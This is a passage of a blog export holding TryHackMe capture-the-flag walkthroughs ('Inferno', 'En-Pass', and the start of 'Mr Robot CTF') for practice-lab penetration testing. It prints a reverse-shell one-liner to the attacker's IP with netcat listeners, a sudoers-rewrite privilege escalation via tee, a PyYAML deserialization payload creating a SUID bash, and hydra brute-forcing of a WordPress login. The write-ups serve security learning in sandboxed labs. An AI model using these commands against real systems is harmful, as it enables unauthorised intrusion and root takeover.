\u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Unauthorized\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn\u0026#39;t understand how to supply the credentials required.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at 10.10.241.114 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; [-] Login failed! Please check your username and password.   We failed because we have to authenticate two times.\nModify the exploit command with the following parameters:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  python exploit.py http://admin:[REDACTED]@10.10.241.114/inferno/ admin [REDACTED] 10.9.140.180 1234 linux [+] Please execute the following command on your vps: echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;/dev/tcp/10.9.140.180/1235 0\u0026gt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | nc -lnvp 1234 nc -lnvp 1235 [+] Please confirm that you have done the two command above [y/n] [Y/n] y [+] Starting... [+] Login Content : {\u0026#34;status\u0026#34;:\u0026#34;success\u0026#34;,\u0026#34;data\u0026#34;:{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;}} [+] Login success! [+] Getting writeable path... [+] Path Content : {\u0026#34;status\u0026#34;:\u0026#34;success\u0026#34;,\u0026#34;data\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;inferno\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;\\/var\\/www\\/html\\/inferno\u0026#34;}} [+] Writeable Path : /var/www/html/inferno [+] Sending payload... {\u0026#34;status\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;No Results Returned\u0026#34;} [+] Exploit finished! [+] Enjoy your reverse shell!   Do not forget to run the two provided commands in the separate terminals.\n1  echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;/dev/tcp/10.9.140.180/1235 0\u0026gt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | nc -lnvp 1234   1 2 3 4 5  nc -lnvp 1235 connect to [10.9.140.180] from (UNKNOWN) [10.10.241.114] 52036 bash: cannot set terminal process group (922): Inappropriate ioctl for device bash: no job control in this shell www-data@Inferno:/var/www/html/inferno/components/filemanager$ exit   Right after getting a reverse shell we are getting kicked out.\nWe can spawn /bin/sh in a hope of bypassing this (probably) security measure.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  id uid=33(www-data) gid=33(www-data) groups=33(www-data) whoami www-data pwd /var/www/html/inferno/components/filemanager ls -la total 100 drwxr-xr-x 3 root root 4096 Jan 11 15:22 . drwxr-xr-x 17 root root 4096 Jan 11 15:22 .. -rwxr-xr-x 1 root root 1831 Jan 11 15:22 class.dirzip.php -rwxr-xr-x 1 root root 22371 Jan 11 15:22 class.filemanager.php -rwxr-xr-x 1 root root 3480 Jan 11 15:22 context_menu.json -rwxr-xr-x 1 root root 2695 Jan 11 15:22 controller.php -rwxr-xr-x 1 root root 5501 Jan 11 15:22 dialog.php -rwxr-xr-x 1 root root 2092 Jan 11 15:22 dialog_upload.php -rwxr-xr-x 1 root root 3406 Jan 11 15:22 download.php -rwxr-xr-x 1 root root 34802 Jan 11 15:22 init.js drwxr-xr-x 2 root root 4096 Jan 11 15:22 upload_scripts   Navigating to home directory we will find that there is another user present on the system called dante.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  cd /home ls -la total 12 drwxr-xr-x 3 root root 4096 Jan 11 15:19 . drwxr-xr-x 24 root root 4096 Jan 11 14:57 .. drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 dante cd dante ls -la total 72 drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 . drwxr-xr-x 3 root root 4096 Jan 11 15:19 .. -rw------- 1 dante dante 106 Jan 11 15:27 .Xauthority lrwxrwxrwx 1 root root 9 Jan 11 15:22 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 dante dante 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 dante dante 3771 Apr 4 2018 .bashrc drwx------ 2 dante dante 4096 Jan 11 15:25 .cache drwxr-x--- 3 dante dante 4096 Jan 11 15:46 .config drwx------ 4 dante dante 4096 Jan 11 15:46 .gnupg -rw-r--r-- 1 dante dante 807 Apr 4 2018 .profile -rw-r--r-- 1 dante dante 0 Jan 11 15:30 .sudo_as_admin_successful drwxr-xr-x 2 root root 4096 Jan 11 15:29 Desktop drwxr-xr-x 2 root root 4096 Jan 11 15:29 Documents drwxr-xr-x 2 root root 4096 Jan 11 15:29 Downloads drwxr-xr-x 2 root root 4096 Jan 11 15:22 Music drwxr-xr-x 2 root root 4096 Jan 11 15:22 Pictures drwxr-xr-x 2 root root 4096 Jan 11 15:22 Public drwxr-xr-x 2 root root 4096 Jan 11 15:22 Templates drwxr-xr-x 2 root root 4096 Jan 11 15:22 Videos -rw------- 1 dante dante 33 Jan 11 15:22 local.txt cat local.txt cat: local.txt: Permission denied   Proceeding with directory enumeration we will find interesting file in the Downlaods folder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  cd Documents\tls -la total 464 drwxr-xr-x 2 root root 4096 Jan 11 15:29 . drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 .. -rwxr-xr-x 1 root root 35312 Jan 11 15:29 beatrice.doc -rwxr-xr-x 1 root root 63704 Jan 11 15:29 caronte.doc -rwxr-xr-x 1 root root 133792 Jan 11 15:29 centauro.doc -rwxr-xr-x 1 root root 88280 Jan 11 15:29 cerbero.doc -rwxr-xr-x 1 root root 137440 Jan 11 15:29 virgilio.doc cd .. cd Downloads ls -la total 4420 drwxr-xr-x 2 root root 4096 Jan 11 15:29 . drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 .. -rw-r--r-- 1 root root 1511 Nov 3 11:52 .download.dat -rwxr-xr-x 1 root root 137440 Jan 11 15:29 CantoI.docx -rwxr-xr-x 1 root root 141528 Jan 11 15:29 CantoII.docx -rwxr-xr-x 1 root root 88280 Jan 11 15:29 CantoIII.docx -rwxr-xr-x 1 root root 63704 Jan 11 15:29 CantoIV.docx -rwxr-xr-x 1 root root 133792 Jan 11 15:29 CantoIX.docx -rwxr-xr-x 1 root root 43224 Jan 11 15:22 CantoV.docx -rwxr-xr-x 1 root root 133792 Jan 11 15:29 CantoVI.docx -rwxr-xr-x 1 root root 141528 Jan 11 15:29 CantoVII.docx -rwxr-xr-x 1 root root 63704 Jan 11 15:29 CantoX.docx -rwxr-xr-x 1 root root 121432 Jan 11 15:29 CantoXI.docx -rwxr-xr-x 1 root root 149080 Jan 11 15:22 CantoXII.docx -rwxr-xr-x 1 root root 216256 Jan 11 15:22 CantoXIII.docx -rwxr-xr-x 1 root root 141528 Jan 11 15:29 CantoXIV.docx -rwxr-xr-x 1 root root 141528 Jan 11 15:29 CantoXIX.docx -rwxr-xr-x 1 root root 88280 Jan 11 15:29 CantoXV.docx -rwxr-xr-x 1 root root 137440 Jan 11 15:29 CantoXVI.docx -rwxr-xr-x 1 root root 121432 Jan 11 15:29 CantoXVII.docx -rwxr-xr-x 1 root root 2351792 Jan 11 15:22 CantoXVIII.docx -rwxr-xr-x 1 root root 63704 Jan 11 15:29 CantoXX.docx   Found .download.dat file contains hexadecimal values which we will convert into ASCII characters.\n1 2  cat .download.dat c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a   \nScrolling down the converted output we will find the ssh credentials.\nUser Access In the home directory, we can grab the user flag called local.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ssh dante@10.10.241.114 dante@10.10.241.114\u0026#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Feb 16 20:35:07 UTC 2021 System load: 0.0 Processes: 594 Usage of /: 42.0% of 8.79GB Users logged in: 0 Memory usage: 68% IP address for eth0: 10.10.241.114 Swap usage: 0% 39 packages can be updated. 0 updates are security updates. Last login: Tue Feb 16 20:34:47 2021 from 10.9.140.180 dante@Inferno:~$ cat local.txt | wc -c 33   Privilege Escalation Once again we are being kicked out so we will repeat our \u0026ldquo;bypass\u0026rdquo; by spawning sh followed by sudo -l .\n1 2 3 4 5 6 7  dante@Inferno:~$ /bin/sh $ sudo -l Matching Defaults entries for dante on Inferno: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dante may run the following commands on Inferno: (root) NOPASSWD: /usr/bin/tee   From the output we can see that we may run tee as root.\nAs per usual, we will visit GTFObins for more information on how to escalate our privileges with tee.\nWe will configure sudoers file to run any binary as root. Following with sudo bash -p we will escalate privileges to root and grab the flag called proof.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  $ id uid=1000(dante) gid=1000(dante) groups=1000(dante),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev) $ echo \u0026#34;ALL ALL=NOPASSWD: ALL\u0026#34; | sudo tee -a /etc/sudoers ALL ALL=NOPASSWD: ALL $ sudo -l Matching Defaults entries for dante on Inferno: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dante may run the following commands on Inferno: (root) NOPASSWD: /usr/bin/tee (root) NOPASSWD: ALL $ sudo bash -p root@Inferno:~# /bin/sh # id uid=0(root) gid=0(root) groups=0(root) # cd /root # ls -la total 32 drwx------ 5 root root 4096 Jan 11 15:45 . drwxr-xr-x 24 root root 4096 Jan 11 14:57 .. lrwxrwxrwx 1 root root 9 Jan 11 15:22 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwxr-x--- 3 root root 4096 Jan 11 15:45 .config drwxr-xr-x 3 root root 4096 Jan 11 15:30 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw------- 1 root root 79 Jan 11 15:45 proof.txt drwx------ 2 root root 4096 Jan 11 15:19 .ssh # cat proof.txt | wc -c 79   \rThank you for reading this blog post.\n","description":"Real Life machine vs CTF. The machine is designed to be real-life and is perfect for newbies starting out in penetration testing","id":1,"section":"posts","tags":["enumeration","brute force","codiad","privilege escalation"],"title":"Inferno [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/inferno/"},{"content":"   Title  En-pass     Info   Get what you can\u0026rsquo;t.   Difficulty   Medium   Date 2021/02/15    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.175.174\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  nmap -v -A -T4 -p- 10.10.175.174 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA) | 256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA) |_ 256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519) 8001/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: En-Pass No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).   The website is running on the unusual port so we will note it down. There are three pictures posted and nothing interesting in the page source.\n\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -e -u http://10.10.175.174:8001/ -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html,bak,old,js [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 11:30:30 Starting gobuster =============================================================== . . . http://10.10.175.174:8001/403.php (Status: 403) . . . http://10.10.175.174:8001/reg.php (Status: 200) . . . http://10.10.175.174:8001/web (Status: 301) http://10.10.175.174:8001/zip (Status: 301)   Two interesting files and two directories were revealed. We will start with 403.php\n1  http://10.10.175.174:8001/403.php   \nNext we will proceed with ** reg.php**\n1  http://10.10.175.174:8001/reg.php   \nIn the middle of the page there is located a text field where we can input any string. After pressing Submit button the page gives us reply which contains either \u0026ldquo;Try Try!!\u0026rdquo; or \u0026ldquo;Try Again!!\u0026rdquo;. Let\u0026rsquo;s analyze the source code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  \u0026lt;?php if($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;){ $title = $_POST[\u0026#34;title\u0026#34;]; if (!preg_match(\u0026#39;/[a-zA-Z0-9]/i\u0026#39; , $title )){ $val = explode(\u0026#34;,\u0026#34;,$title); $sum = 0; for($i = 0 ; $i \u0026lt; 9; $i++){ if ( (strlen($val[0]) == 2) and (strlen($val[8]) == 3 )) { if ( $val[5] !=$val[8] and $val[3]!=$val[7] ) $sum = $sum+ (bool)$val[$i].\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } } if ( ($sum) == 9 ){ echo $result;//do not worry you\u0026#39;ll get what you need.  echo \u0026#34; Congo You Got It !! Nice \u0026#34;; } else{ echo \u0026#34; Try Try!!\u0026#34;; } } else{ echo \u0026#34; Try Again!! \u0026#34;; } } ?\u0026gt;  To bypass the filter in the above code we must build a very specific string based on the conditions:\n lowercase and uppercase characters and numbers are not allowed input string is split by comma as the delimiter substrings needs to be certain length or different values based on their order based on all the conditions a sum value is calculated and compared with a value of 9  Following the provided points, we will create this string and then press the Submit button.\n !!,!,!,!,!,!,!!,!!!,!!!,!\n \n Nice. Password : cimihan_are_you_here?\n Going back to the /web directory found earlier and navigating to its location, we are informed that we don\u0026rsquo;t have permission to access this resource.\n\nBecause this is a directory, we will perform a brute-force attack again.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir -e -u http://10.10.175.174:8001/web/ -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/web/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: old,js,php,txt,html,bak [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 11:43:17 Starting gobuster =============================================================== http://10.10.175.174:8001/web/resources (Status: 301)   Finding another directory, we don\u0026rsquo;t have permission to access this resource either.\nLet\u0026rsquo;s continue with directory brute-forcing.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir -e -u http://10.10.175.174:8001/web/resources -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/web/resources [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: bak,old,js,php,txt,html [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 12:04:03 Starting gobuster =============================================================== http://10.10.175.174:8001/web/resources/infoseek (Status: 301)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir -e -u http://10.10.175.174:8001/web/resources/infoseek -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/web/resources/infoseek [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html,bak,old,js [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 12:13:30 Starting gobuster =============================================================== http://10.10.175.174:8001/web/resources/infoseek/configure (Status: 301)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir -e -u http://10.10.175.174:8001/web/resources/infoseek/configure -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/web/resources/infoseek/configure [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: old,js,php,txt,html,bak [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 12:19:55 Starting gobuster =============================================================== http://10.10.175.174:8001/web/resources/infoseek/configure/key   After not giving up and repeating the process over and over, we will find a private key.\n\nThe last directory /zip found during the initial brute force is just a rabbit hole.\n\nFuzzing From the host scan we know that on the port 22 SSH service is running. We found a private key, but we still don\u0026rsquo;t have a username. Another dictionary attack may be a possibility but before that, we will try fuzzing the found php pages starting with 403.php\nTo perform this task, we will need403fuzzer and Burp Suite with Intercept off. You can perform this task solely in the command line but we will take advantage of going through Responses with status code **200 ** in the Burp Suite.\n1  python3 403fuzzer.py -u http://10.10.175.174:8001/403.php --proxy http://localhost:8080   Based on the methodology mentioned above, we will find a response with a message which contains a username.\n1  http://10.10.175.174:8001/403.php/..;/   \nGaining Access During the directory brute-force phases, we obtained Encrypted Private key and a password. Now, we will need a private key to be able to use SSH. Using following command and found password as a phrase, we get a key stored in a id_rsa file.\n1 2 3  openssl rsa -in key -out id_rsa Enter pass phrase for key: writing RSA key   Use this private key to gain access to a user account and get the first flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ssh -i id_rsa imsau@10.10.175.174 $ whoami imsau $ id uid=1002(imsau) gid=1002(imsau) groups=1002(imsau) $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;; imsau@enpass:~$ ls -la total 32 drwxr-xr-x 4 imsau imsau 4096 Jan 31 19:01 . drwxr-xr-x 3 root root 4096 Jan 31 19:53 .. lrwxrwxrwx 1 root root 9 Jan 31 19:01 .bash_history -\u0026gt; /dev/null -r-------- 1 imsau imsau 220 Aug 31 2015 .bash_logout -r-------- 1 imsau imsau 3771 Aug 31 2015 .bashrc drwx------ 2 imsau imsau 4096 Jan 31 17:46 .cache -rw-r--r-- 1 imsau imsau 655 Jul 12 2019 .profile drwx------ 2 imsau imsau 4096 Jan 31 16:34 .ssh -r-------- 1 imsau imsau 33 Jan 31 16:34 user.txt lrwxrwxrwx 1 root root 9 Jan 31 19:01 .viminfo -\u0026gt; /dev/null imsau@enpass:~$ cat user.txt | wc -c 33   Privilege Escalation We will use linPEAS script to enumerate the host. Start a python server on your local machine and download the script on the target host.\n1 2  python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...   Do not forget to add execution permission and then run the script.\n1 2 3 4 5 6 7 8 9 10 11 12  wget http://10.9.140.180:8000/linpeas.sh --2021-02-15 18:53:43-- http://10.9.140.180:8000/linpeas.sh Connecting to 10.9.140.180:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 292875 (286K) [text/x-sh] Saving to: ‘linpeas.sh.1’ linpeas.sh.1 100%[===================\u0026gt;] 286.01K 100KB/s in 2.8s 2021-02-15 18:53:46 (100 KB/s) - ‘linpeas.sh.1’ saved [292875/292875] imsau@enpass:~$ chmod +x linpeas.sh imsau@enpass:~$ ./linpeas.sh   Nothing special or interesting was found. Let\u0026rsquo;s do manual enumeration and look inside all the directories we have permission to go in. Starting out with the most used ones, we will find an interesting python script inside the /opt directory.\n1 2 3 4 5  imsau@enpass:/opt/scripts$ ls -la total 12 drwxr-xr-x 2 root root 4096 Jan 31 19:40 . drwxr-xr-x 3 root root 4096 Jan 31 16:34 .. -r-xr-xr-x 1 root root 250 Jan 31 19:40 file.py   The file is owned by root but no cronjob was found. That means, we will not be able to abuse it this way.\n1 2 3 4 5 6 7 8 9 10 11 12  #!/usr/bin/python import yaml class Execute(): def __init__(self,file_name =\u0026#34;/tmp/file.yml\u0026#34;): self.file_name = file_name self.read_file = open(file_name ,\u0026#34;r\u0026#34;) def run(self): return self.read_file.read() data = yaml.load(Execute().run())   Analyzing the source code and searching for yaml, we will find that plain use of yaml.load(input) function is unsafe since the first release and also deprecated.\n PyYAML yaml.load(input) Deprecation\nhttps://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation\n To take advantage of the unsafe load function, we will create file.yml file in the /tmp directory, with the following line inside.\n1  !!python/object/new:os.system \\[\u0026#34;cp /bin/bash /tmp; chmod +s /tmp/bash\u0026#34;\\]   Observe that our file gets deleted.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  imsau@enpass:/opt$ cd /tmp imsau@enpass:/tmp$ ls -la total 28 drwxrwxrwt 7 root root 4096 Feb 15 19:27 . drwxr-xr-x 23 root root 4096 Feb 15 19:23 .. drwxrwxrwt 2 root root 4096 Feb 15 19:22 .font-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .ICE-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .Test-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .X11-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .XIM-unix imsau@enpass:/tmp$ touch file.yml imsau@enpass:/tmp$ nano file.yml imsau@enpass:/tmp$ cat file.yml !!python/object/new:os.system [\u0026#34;cp /bin/bash /tmp; chmod +s /tmp/bash\u0026#34;] imsau@enpass:/tmp$ ls -la total 1044 drwxrwxrwt 7 root root 4096 Feb 15 19:28 . drwxr-xr-x 23 root root 4096 Feb 15 19:23 .. -rwsr-sr-x 1 root root 1037528 Feb 15 19:28 bash drwxrwxrwt 2 root root 4096 Feb 15 19:22 .font-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .ICE-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .Test-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .X11-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .XIM-unix   When this happen, we will have a SUID bash binary (thanks to the line above) which we are able to run with -p flag to get a root shell.\n1 2 3 4 5 6 7  imsau@enpass:/tmp$ /tmp/bash -p bash-4.3# whoami root bash-4.3# id uid=1002(imsau) gid=1002(imsau) euid=0(root) egid=0(root) groups=0(root),1002(imsau) bash-4.3# cat /root/root.txt | wc -c 32   \rThank you for reading this blog post.\n","description":"Get what you can't.","id":2,"section":"posts","tags":["enumeration","brute force","fuzzing","python","yaml","privilege escalation"],"title":"En-Pass [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/en-pass/"},{"content":"   Title Mr Robot CTF     Info Based on the Mr. Robot show, can you root this box?   Difficulty Medium    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  nmap -sV -sC 10.10.43.138 -oN initial.nmap Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 11:50 CST Nmap scan report for 10.10.43.138 Host is up (0.076s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Site doesn\u0026#39;t have a title (text/html). 443/tcp open ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn\u0026#39;t have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  gobuster dir -u http://10.10.43.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.43.138 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/02/06 12:05:27 Starting gobuster =============================================================== /images (Status: 301) /blog (Status: 301) /sitemap (Status: 200) /rss (Status: 301) /login (Status: 302) /0 (Status: 301) /video (Status: 301) /feed (Status: 301) /image (Status: 301) /atom (Status: 301) /wp-content (Status: 301) /admin (Status: 301) /audio (Status: 301) /intro (Status: 200) /wp-login (Status: 200) /css (Status: 301) /rss2 (Status: 301) /license (Status: 200) /wp-includes (Status: 301) /js (Status: 301) /Image (Status: 301) /rdf (Status: 301) /page1 (Status: 301) /readme (Status: 200) /robots (Status: 200) /dashboard (Status: 302) /%20 (Status: 301) Progress: 4512 / 87665 (5.15%)   Let us recall what each HTTP code means:\n 200 OK: Standard response for successful HTTP requests. 301 Moved Permanently : This and all future requests should be directed to the given URL. 302 Found : Tells the client to look at (browse to) another URL, common way of performing URL redirection.  Navigating to /robots.txt reveals the first key and an important file which looks like a username/password dictionary.\n\nWe will download found dictionary by visiting /fsocity.dic and perform sorting and duplicates removing for further faster crawling.\n1 2 3 4 5  cat fsocity.dic | wc -l 858160 sort fsocity.dic | uniq \u0026gt; fsociety.txt cat fsociety.txt | wc -l 11451   The first key can be obtained by navigating to /key-1-of-3.txt\n\nBrute Forcing Wordpress Credentials Let us continue with directories we found earlier with gobuster. Visiting /login reveals Wordpress login form.\n\nWe will intercept post request on the login form with BurpSuite and analyze its content.\n\n\nNext we will use hydra and found dictionary to brute-force the correct username with static password \u0026ldquo;password\u0026rdquo;. Note we have to add error message at the end of our post form.\n1  hydra -L fsocity.dic -p password 10.10.43.138 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:Invalid username\u0026#34;   Hydra found a valid username Elliot which we will use in the next step to brute force his password.\n\nOnce again note the error message provided after using an incorrect password.\n\nThis time we will use static username and found dictionary for password 